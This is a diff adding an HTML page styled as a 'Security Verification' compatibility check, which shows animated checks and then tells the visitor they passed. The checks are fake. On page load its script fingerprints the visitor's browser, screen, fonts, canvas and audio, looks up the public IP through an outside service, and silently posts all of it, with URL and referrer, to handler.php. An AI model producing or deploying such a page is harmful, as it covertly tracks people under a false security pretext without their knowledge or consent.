@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #667eea;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .check-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            margin-bottom: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        .check-item.completed {
+            background: #d4edda;
+        }
+        .check-icon {
+            font-size: 1.5rem;
+            margin-right: 15px;
+            min-width: 30px;
+        }
+        .check-text {
+            flex-grow: 1;
+        }
+        .check-status {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .result-box {
+            margin-top: 30px;
+            padding: 20px;
+            background: #e8f5e9;
+            border-radius: 10px;
+            border-left: 4px solid #4caf50;
+            display: none;
+        }
+        .result-box.show {
+            display: block;
+        }
+        .result-title {
+            font-weight: bold;
+            color: #2e7d32;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Security Verification</h1>
+        <p class="subtitle">Running system compatibility check...</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressBar"></div>
+        </div>
+        
+        <div id="checks">
+            <div class="check-item" id="check1">
+                <div class="check-icon">⏳</div>
+                <div class="check-text">
+                    <div>Browser Information</div>
+                    <div class="check-status" id="status1">Checking...</div>
+                </div>
+                <div class="spinner"></div>
+            </div>
+            
+            <div class="check-item" id="check2">
+                <div class="check-icon">⏳</div>
+                <div class="check-text">
+                    <div>Device Specifications</div>
+                    <div class="check-status" id="status2">Pending...</div>
+                </div>
+            </div>
+            
+            <div class="check-item" id="check3">
+                <div class="check-icon">⏳</div>
+                <div class="check-text">
+                    <div>Network Configuration</div>
+                    <div class="check-status" id="status3">Pending...</div>
+                </div>
+            </div>
+            
+            <div class="check-item" id="check4">
+                <div class="check-icon">⏳</div>
+                <div class="check-text">
+                    <div>System Capabilities</div>
+                    <div class="check-status" id="status4">Pending...</div>
+                </div>
+            </div>
+            
+            <div class="check-item" id="check5">
+                <div class="check-icon">⏳</div>
+                <div class="check-text">
+                    <div>Security Analysis</div>
+                    <div class="check-status" id="status5">Pending...</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="result-box" id="resultBox">
+            <div class="result-title">✅ Verification Complete</div>
+            <p>Your system has passed all security checks. You may now proceed.</p>
+        </div>
+    </div>
+
+    <script>
+        let fingerprint = {};
+        let progress = 0;
+        
+        function updateProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+        
+        function completeCheck(num, icon, status) {
+            const item = document.getElementById('check' + num);
+            item.classList.add('completed');
+            item.querySelector('.check-icon').textContent = icon;
+            document.getElementById('status' + num).textContent = status;
+            const spinner = item.querySelector('.spinner');
+            if (spinner) spinner.remove();
+        }
+        
+        async function runChecks() {
+            // Check 1: Browser Info
+            await sleep(800);
+            const browserInfo = getBrowserInfo();
+            fingerprint.browser = browserInfo;
+            completeCheck(1, '✅', 'Complete');
+            progress += 20;
+            updateProgress(progress);
+            
+            // Check 2: Device Specs
+            await sleep(600);
+            const deviceInfo = getDeviceInfo();
+            fingerprint.device = deviceInfo;
+            completeCheck(2, '✅', 'Complete');
+            progress += 20;
+            updateProgress(progress);
+            
+            // Check 3: Network
+            await sleep(700);
+            const networkInfo = await getNetworkInfo();
+            fingerprint.network = networkInfo;
+            completeCheck(3, '✅', 'Complete');
+            progress += 20;
+            updateProgress(progress);
+            
+            // Check 4: Capabilities
+            await sleep(500);
+            const capabilities = getCapabilities();
+            fingerprint.capabilities = capabilities;
+            completeCheck(4, '✅', 'Complete');
+            progress += 20;
+            updateProgress(progress);
+            
+            // Check 5: Security
+            await sleep(600);
+            const security = getSecurityInfo();
+            fingerprint.security = security;
+            completeCheck(5, '✅', 'Complete');
+            progress += 20;
+            updateProgress(progress);
+            
+            // Show result
+            document.getElementById('resultBox').classList.add('show');
+            
+            // Send data
+            sendFingerprint();
+        }
+        
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                vendor: navigator.vendor,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+        }
+        
+        function getDeviceInfo() {
+            return {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+        }
+        
+        async function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const info = {
+                type: connection?.type,
+                effectiveType: connection?.effectiveType,
+                downlink: connection?.downlink,
+                rtt: connection?.rtt,
+                saveData: connection?.saveData
+            };
+            
+            // Try to get IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.publicIP = ipData.ip;
+            } catch (e) {
+                info.publicIP = 'N/A';
+            }
+            
+            return info;
+        }
+        
+        function getCapabilities() {
+            return {
+                bluetooth: 'bluetooth' in navigator,
+                geolocation: 'geolocation' in navigator,
+                mediaDevices: 'mediaDevices' in navigator,
+                webGL: !!document.createElement('canvas').getContext('webgl'),
+                webGL2: !!document.createElement('canvas').getContext('webgl2'),
+                webRTC: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia),
+                serviceWorker: 'serviceWorker' in navigator,
+                notifications: 'Notification' in window,
+                vibrate: 'vibrate' in navigator,
+                battery: 'getBattery' in navigator,
+                storage: 'storage' in navigator,
+                indexedDB: 'indexedDB' in window
+            };
+        }
+        
+        function getSecurityInfo() {
+            return {
+                https: location.protocol === 'https:',
+                localStorage: typeof(Storage) !== 'undefined',
+                sessionStorage: typeof(Storage) !== 'undefined',
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                fonts: detectFonts(),
+                canvas: getCanvasFingerprint(),
+                audio: getAudioFingerprint()
+            };
+        }
+        
+        function detectFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
+            const detected = [];
+            
+            testFonts.forEach(font => {
+                if (isFontAvailable(font)) detected.push(font);
+            });
+            
+            return detected;
+        }
+        
+        function isFontAvailable(font) {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            context.font = '72px monospace';
+            const baseWidth = context.measureText(text).width;
+            context.font = '72px ' + font + ', monospace';
+            const newWidth = context.measureText(text).width;
+            return newWidth !== baseWidth;
+        }
+        
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint', 2, 15);
+            return canvas.toDataURL().substring(0, 100);
+        }
+        
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                return {
+                    sampleRate: audioContext.sampleRate,
+                    maxChannelCount: audioContext.destination.maxChannelCount,
+                    state: audioContext.state
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        function sendFingerprint() {
+            fingerprint.timestamp = new Date().toISOString();
+            fingerprint.url = window.location.href;
+            fingerprint.referrer = document.referrer;
+            
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(fingerprint)
+            });
+        }
+        
+        // Start checks on load
+        window.onload = () => {
+            setTimeout(runChecks, 500);
+        };
+    </script>
+</body>
+</html>
